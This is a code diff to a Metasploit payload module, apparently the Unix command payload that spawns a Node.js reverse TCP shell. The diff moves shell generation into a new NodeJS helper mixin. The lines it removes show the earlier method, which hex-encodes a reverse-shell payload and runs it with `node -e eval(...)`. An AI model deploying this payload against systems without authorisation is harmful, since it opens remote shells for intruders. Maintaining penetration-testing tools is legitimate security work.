@@ -6,6 +6,7 @@
 ##
 
 require 'msf/core'
+require 'msf/core/payload/nodejs'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -13,6 +14,7 @@ require 'msf/base/sessions/command_shell_options'
 module Metasploit3
 
   include Msf::Payload::Single
+  include Msf::Payload::NodeJS
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -36,8 +38,6 @@ module Metasploit3
   end
 
   def command_string
-    payload = framework.payloads.create('nodejs/shell_reverse_tcp')
-    payload.datastore.merge! datastore
-    "node -e 'eval(\"#{Rex::Text.to_hex(payload.generate, "\\x")}\");'"
+    nodejs_cmd(nodejs_reverse_tcp)
   end
 end
